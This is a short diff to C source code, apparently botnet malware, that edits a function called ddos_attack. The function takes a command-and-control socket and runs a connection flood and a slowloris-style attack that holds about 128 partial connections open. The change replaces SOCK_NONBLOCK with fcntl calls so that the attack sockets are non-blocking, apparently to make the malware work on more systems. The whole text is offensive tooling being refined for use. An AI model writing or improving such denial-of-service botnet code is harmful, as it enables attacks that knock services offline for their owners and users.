@@ -355,7 +355,12 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
         };
         
         while (time(NULL) - start_time < duration) {
-            sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+            sock = socket(AF_INET, SOCK_STREAM, 0);
+            if (sock != -1) {
+                // Rendre le socket non-bloquant avec fcntl
+                int flags = fcntl(sock, F_GETFL, 0);
+                fcntl(sock, F_SETFL, flags | O_NONBLOCK);
+            }
             if (sock != -1) {
                 if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                     char request[256];
@@ -384,8 +389,11 @@ void ddos_attack(int c2_socket, char* target, int port, int duration, char* meth
         while (time(NULL) - start_time < duration) {
             // Maintenir ~128 connexions
             while (active_sockets < max_sockets) {
-                sock = socket(AF_INET, SOCK_STREAM | SOCK_NONBLOCK, 0);
+                sock = socket(AF_INET, SOCK_STREAM, 0);
                 if (sock != -1) {
+                    // Rendre le socket non-bloquant avec fcntl
+                    int flags = fcntl(sock, F_GETFL, 0);
+                    fcntl(sock, F_SETFL, flags | O_NONBLOCK);
                     if (connect(sock, (struct sockaddr*)&target_addr, sizeof(target_addr)) != -1) {
                         char partial_header[64];
                         snprintf(partial_header, sizeof(partial_header),
